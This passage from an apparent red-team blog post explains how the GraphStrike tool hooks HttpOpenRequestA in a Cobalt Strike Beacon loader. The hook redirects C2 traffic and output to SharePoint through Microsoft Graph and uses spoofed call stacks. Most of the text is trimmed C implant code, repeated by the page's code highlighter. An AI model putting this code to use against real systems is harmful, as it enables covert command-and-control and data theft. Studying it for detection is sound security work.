class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"/items//content"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> + 1</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">reqSize, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">sprintf</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"%s/items/%s/content"</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, SHAREPOINT_ADDRESS, id</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Assemble httpPostCheckSizeUrl by trimming off "/content" from the end of the httpPostUri.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">int</span><span class="enlighter-text"> copyLen = </span><span class="enlighter-g1">(</span><span class="enlighter-text">PVOID</span><span class="enlighter-g1">)(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strstr</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"/content"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)))</span><span class="enlighter-text"> - pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostCheckSizeUrl = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">calloc</span><span class="enlighter-g1">(</span><span class="enlighter-text">copyLen + 1, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-k5">char</span><span class="enlighter-g1">))</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">memcpy</span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostCheckSizeUrl, pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri, copyLen</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Free buffers</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">tempUri</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">free</span><span class="enlighter-g1">(</span><span class="enlighter-text">response</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Toggle firstPost to false so we don't repeat this loop.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">firstPost = </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">; </span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div></div><div class="enlighter-raw">... Trimmed for Brevity ...

// If this is the first POST request for the Beacon, create the Beacon output file for the TS to read from.
if ( pMemAddrs-&gt;firstPost &amp;&amp; !pMemAddrs-&gt;activeGet)
{        
    // ------------------------------------ Upload new file for Beacon output --------------------------------------- 

    // Assemble URI to create new file in SharePoint using the Beacon metadata + beaconId as a name.
    tempUri = C_PTR ( pMemAddrs-&gt;Api.msvcrt.calloc(1000, sizeof(char)) );
    LPCSTR beaconId = pMemAddrs-&gt;Api.msvcrt.strstr(lpszObjectName, HTTP_POST_PREFIX ) + pMemAddrs-&gt;Api.msvcrt.strlen(HTTP_POST_PREFIX);
    pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s%s%s:/content" ) ), SHAREPOINT_ADDRESS, pMemAddrs-&gt;metaData, BID_DELIMITER, beaconId );

    // Send request
    response = MakeWebRequest(pMemAddrs-&gt;hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs-&gt;httpPostHeaders, NULL, pMemAddrs ); 

    // Parse out fileId from response
    ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

    // Assemble httpPostUri that will be used for subsequent Beacon comms
    reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs-&gt;Api.msvcrt.strlen(id) + pMemAddrs-&gt;Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
    pMemAddrs-&gt;httpPostUri = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
    pMemAddrs-&gt;Api.msvcrt.sprintf(pMemAddrs-&gt;httpPostUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

    // Assemble httpPostCheckSizeUrl by trimming off "/content" from the end of the httpPostUri.
    int copyLen = (PVOID)(pMemAddrs-&gt;Api.msvcrt.strstr(pMemAddrs-&gt;httpPostUri, C_PTR ( OFFSET ( "/content" ) ))) - pMemAddrs-&gt;httpPostUri;
    pMemAddrs-&gt;httpPostCheckSizeUrl = pMemAddrs-&gt;Api.msvcrt.calloc(copyLen + 1, sizeof(char));
    pMemAddrs-&gt;Api.msvcrt.memcpy(pMemAddrs-&gt;httpPostCheckSizeUrl, pMemAddrs-&gt;httpPostUri, copyLen);

    // Free buffers
    pMemAddrs-&gt;Api.msvcrt.free(tempUri);
    pMemAddrs-&gt;Api.msvcrt.free(response);

    // Toggle firstPost to false so we don't repeat this loop.
    pMemAddrs-&gt;firstPost = FALSE; 
}

... Trimmed for Brevity ...</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">... Trimmed for Brevity ...

// If this is the first POST request for the Beacon, create the Beacon output file for the TS to read from.
if ( pMemAddrs-&gt;firstPost &amp;&amp; !pMemAddrs-&gt;activeGet)
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;// ------------------------------------ Upload new file for Beacon output ---------------------------------------&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;// Assemble URI to create new file in SharePoint using the Beacon metadata + beaconId as a name.
&nbsp;&nbsp;&nbsp;&nbsp;tempUri = C_PTR ( pMemAddrs-&gt;Api.msvcrt.calloc(1000, sizeof(char)) );
&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR beaconId = pMemAddrs-&gt;Api.msvcrt.strstr(lpszObjectName, HTTP_POST_PREFIX ) + pMemAddrs-&gt;Api.msvcrt.strlen(HTTP_POST_PREFIX);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s%s%s:/content" ) ), SHAREPOINT_ADDRESS, pMemAddrs-&gt;metaData, BID_DELIMITER, beaconId );

&nbsp;&nbsp;&nbsp;&nbsp;// Send request
&nbsp;&nbsp;&nbsp;&nbsp;response = MakeWebRequest(pMemAddrs-&gt;hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs-&gt;httpPostHeaders, NULL, pMemAddrs );&nbsp;

&nbsp;&nbsp;&nbsp;&nbsp;// Parse out fileId from response
&nbsp;&nbsp;&nbsp;&nbsp;ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

&nbsp;&nbsp;&nbsp;&nbsp;// Assemble httpPostUri that will be used for subsequent Beacon comms
&nbsp;&nbsp;&nbsp;&nbsp;reqSize = pMemAddrs-&gt;Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs-&gt;Api.msvcrt.strlen(id) + pMemAddrs-&gt;Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;httpPostUri = pMemAddrs-&gt;Api.msvcrt.calloc(reqSize, sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.sprintf(pMemAddrs-&gt;httpPostUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

&nbsp;&nbsp;&nbsp;&nbsp;// Assemble httpPostCheckSizeUrl by trimming off "/content" from the end of the httpPostUri.
&nbsp;&nbsp;&nbsp;&nbsp;int copyLen = (PVOID)(pMemAddrs-&gt;Api.msvcrt.strstr(pMemAddrs-&gt;httpPostUri, C_PTR ( OFFSET ( "/content" ) ))) - pMemAddrs-&gt;httpPostUri;
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;httpPostCheckSizeUrl = pMemAddrs-&gt;Api.msvcrt.calloc(copyLen + 1, sizeof(char));
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.memcpy(pMemAddrs-&gt;httpPostCheckSizeUrl, pMemAddrs-&gt;httpPostUri, copyLen);

&nbsp;&nbsp;&nbsp;&nbsp;// Free buffers
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.free(tempUri);
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;Api.msvcrt.free(response);

&nbsp;&nbsp;&nbsp;&nbsp;// Toggle firstPost to false so we don't repeat this loop.
&nbsp;&nbsp;&nbsp;&nbsp;pMemAddrs-&gt;firstPost = FALSE;&nbsp;
}

... Trimmed for Brevity ...</pre>
</div>
</div>
</div>
<p>Both blocks perform similar actions, creating new files in SharePoint by using the previously discussed values to assemble the file names. After the request has been sent using ‘MakeWebRequest’, the newly created file’s SharePoint ID is parsed to be used in all subsequent requests made by Beacon. The ‘firstGet’ and ‘firstPost’ Booleans control whether these code blocks run or not, and are toggled from TRUE to FALSE when they do so that subsequent calls to HttpOpenRequestA_Hook don’t result in additional files being created.</p>
</div>
<h4 id="Modifying-API-Call-Parameters-and-Non-GraphStrike-Beacons" data-renderer-start-pos="65809"><span class="ez-toc-section" id="Modifying_API_Call_Parameters_and_Non-GraphStrike_Beacons" ez-toc-data-id="#Modifying_API_Call_Parameters_and_Non-GraphStrike_Beacons"></span>Modifying API Call Parameters and Non-GraphStrike Beacons<span class="ez-toc-section-end"></span></h4>
<p data-renderer-start-pos="65868">This section is short and simple, but incredibly important. Many times I have mentioned that the IAT hooking implemented by AceLdr grants us the ability to tweak and twiddle with the parameters sent by Beacon to the hooked API. The implementation and impact of this ability can be seen in the below code snippet which is again from the HttpOpenRequestA_Hook function:</p>
<div class="code-block cc-ceksvt">
<div class="cc-9n57oc">
<div class="cc-ygvpeu">
<div role="presentation">
<div class="enlighter-default enlighter-v-standard enlighter-t-enlighter enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-m0">SECTION</span><span class="enlighter-g1">(</span><span class="enlighter-text"> D </span><span class="enlighter-g1">)</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-m0">HttpOpenRequestA_Hook</span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                                LPCSTR lpszVerb, </span></div></div><div class=""><div><span class="enlighter-text">                                                LPCSTR lpszObjectName, </span></div></div><div class=""><div><span class="enlighter-text">                                                LPCSTR lpszVersion, </span></div></div><div class=""><div><span class="enlighter-text">                                                LPCSTR lpszReferrer, </span></div></div><div class=""><div><span class="enlighter-text">                                                LPCSTR *lplpszAcceptTypes, </span></div></div><div class=""><div><span class="enlighter-text">                                                DWORD dwFlags, </span></div></div><div class=""><div><span class="enlighter-text">                                                DWORD_PTR dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HINTERNET       hResult = INVALID_HANDLE_VALUE;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// Only run the following if this is a GraphStrike Beacon</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">graphStrike</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Determine whether this call to HttpOpenRequestA is for a http-get or http-post request</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">msvcrt</span><span class="enlighter-text">.</span><span class="enlighter-m3">strcmp</span><span class="enlighter-g1">(</span><span class="enlighter-text">lpszVerb, </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">OFFSET</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-s0">"GET"</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> == 0</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">activeGet = </span><span class="enlighter-e0">TRUE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">activeGet = </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            </span></div></div><div class=""><div><span class="enlighter-text">        ... Trimmed </span><span class="enlighter-k1">for</span><span class="enlighter-text"> Brevity ...</span></div></div><div class=""><div><span class="enlighter-text">        </span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Set verb and uri to be used with HttpOpenRequest call.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Must be done here so that httpGetUri + httpPostUri are populated first</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">activeGet</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text">            </span></div></div><div class=""><div><span class="enlighter-text">            verb = GET_VERB;</span></div></div><div class=""><div><span class="enlighter-text">            uri = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpGetUri;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            verb = PUT_VERB;</span></div></div><div class=""><div><span class="enlighter-text">            uri = pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">httpPostUri;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-c0">// Finally send request.</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        hResult =  </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-g1">)</span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">HttpOpenRequestA</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">                                        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                        verb, </span></div></div><div class=""><div><span class="enlighter-text">                                        uri, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszVersion </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszReferrer </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lplpszAcceptTypes </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwFlags </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// If not a GraphStrike Beacon, make a normal call to HttpOpenRequestA</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        hResult =  </span><span class="enlighter-g1">(</span><span class="enlighter-text"> HINTERNET </span><span class="enlighter-g1">)</span><span class="enlighter-m0">SPOOF</span><span class="enlighter-g1">(</span><span class="enlighter-text"> pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">HttpOpenRequestA</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">hNet</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        pMemAddrs-</span><span class="enlighter-g1">&gt;</span><span class="enlighter-text">Api.</span><span class="enlighter-m3">net</span><span class="enlighter-text">.</span><span class="enlighter-m3">size</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        hInternet, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszVerb </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszObjectName </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszVersion </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lpszReferrer </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> lplpszAcceptTypes </span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwFlags </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">,</span></div></div><div class=""><div><span class="enlighter-text">                                        </span><span class="enlighter-m0">C_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> </span><span class="enlighter-m0">U_PTR</span><span class="enlighter-g1">(</span><span class="enlighter-text"> dwContext </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">                                        </span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> hResult;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text">;</span></div></div></div><div class="enlighter-raw">SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet, 
                                                LPCSTR lpszVerb, 
                                                LPCSTR lpszObjectName, 
                                                LPCSTR lpszVersion, 
                                                LPCSTR lpszReferrer, 
                                                LPCSTR *lplpszAcceptTypes, 
                                                DWORD dwFlags, 
                                                DWORD_PTR dwContext )
{
    HINTERNET       hResult = INVALID_HANDLE_VALUE;

    ... Trimmed for Brevity ...

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs-&gt;graphStrike)
    
        // Determine whether this call to HttpOpenRequestA is for a http-get or http-post request
        if (pMemAddrs-&gt;Api.msvcrt.strcmp(lpszVerb, C_PTR ( OFFSET ( "GET" ) ) ) == 0)
            pMemAddrs-&gt;activeGet = TRUE;
        else
            pMemAddrs-&gt;activeGet = FALSE;
            
        ... Trimmed for Brevity ...
        
        // Set verb and uri to be used with HttpOpenRequest call.
        // Must be done here so that httpGetUri + httpPostUri are populated first
        if ( pMemAddrs-&gt;activeGet)
        {            
            verb = GET_VERB;
            uri = pMemAddrs-&gt;httpGetUri;
        }
        else
        {
            verb = PUT_VERB;
            uri = pMemAddrs-&gt;httpPostUri;
        }

        // Finally send request.
        hResult =  ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.HttpOpenRequestA,
                                        pMemAddrs-&gt;Api.net.hNet, 
                                        pMemAddrs-&gt;Api.net.size, 
                                        hInternet, 
                                        verb, 
                                        uri, 
                                        C_PTR( lpszVersion ), 
                                        C_PTR( lpszReferrer ), 
                                        C_PTR( lplpszAcceptTypes ), 
                                        C_PTR( U_PTR( dwFlags ) ), 
                                        C_PTR( U_PTR( dwContext ) ) );
    }

    // If not a GraphStrike Beacon, make a normal call to HttpOpenRequestA
    else
        hResult =  ( HINTERNET )SPOOF( pMemAddrs-&gt;Api.net.HttpOpenRequestA, 
                                        pMemAddrs-&gt;Api.net.hNet, 
                                        pMemAddrs-&gt;Api.net.size, 
                                        hInternet, 
                                        C_PTR( lpszVerb ), 
                                        C_PTR( lpszObjectName ), 
                                        C_PTR( lpszVersion ), 
                                        C_PTR( lpszReferrer ), 
                                        C_PTR( lplpszAcceptTypes ), 
                                        C_PTR( U_PTR( dwFlags ) ),
                                        C_PTR( U_PTR( dwContext ) ) );
                                        
    return hResult;
};</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="c">SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpszVerb,&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LPCSTR&nbsp;lpszObjectName,&nbsp;
